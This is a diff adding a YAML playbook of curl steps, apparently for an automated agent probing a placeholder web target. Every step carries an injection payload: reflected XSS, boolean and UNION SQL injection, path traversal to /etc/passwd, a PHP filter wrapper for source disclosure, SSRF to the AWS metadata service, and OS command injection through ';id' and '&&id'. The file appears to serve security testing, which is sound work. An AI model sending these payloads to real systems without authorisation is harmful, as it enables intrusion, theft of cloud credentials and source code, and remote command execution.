@@ -1,0 +1,46 @@
+steps:
+  - tool: curl
+    arguments:
+      url: "http://{target}/search?q=test"
+      additional_args: '-s -L --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'INJECT: Baseline search parameter request for comparison'
+  - tool: curl
+    arguments:
+      url: "http://{target}/search?q=<script>alert(1)</script>"
+      additional_args: '-s -L --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'INJECT: Reflected XSS test in search parameter'
+  - tool: curl
+    arguments:
+      url: "http://{target}/search?q=' OR '1'='1"
+      additional_args: '-s -L --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'INJECT: SQL injection in search parameter (boolean-based)'
+  - tool: curl
+    arguments:
+      url: "http://{target}/search?q=1 UNION SELECT null,null,null--"
+      additional_args: '-s -L --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'INJECT: UNION-based SQL injection test in search parameter'
+  - tool: curl
+    arguments:
+      url: "http://{target}/page?id=../../../etc/passwd"
+      additional_args: '-s -L --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'INJECT: Path Traversal / LFI test for /etc/passwd access'
+  - tool: curl
+    arguments:
+      url: "http://{target}/page?id=php://filter/read=convert.base64-encode/resource=index.php"
+      additional_args: '-s -L --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'INJECT: PHP filter wrapper LFI for source code disclosure'
+  - tool: curl
+    arguments:
+      url: "http://{target}/api/fetch?url=http://169.254.169.254/latest/meta-data/"
+      additional_args: '-s -L --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'INJECT: SSRF test targeting AWS EC2 metadata service (IMDS)'
+  - tool: curl
+    arguments:
+      url: "http://{target}/ping?host=127.0.0.1;id"
+      additional_args: '-s -L --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'CMDINJ: Semicolon command separator test for OS command injection'
+  - tool: curl
+    arguments:
+      url: "http://{target}/ping?host=127.0.0.1%26%26id"
+      additional_args: '-s -L --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'CMDINJ: URL-encoded AND-AND (&&) command separator test'
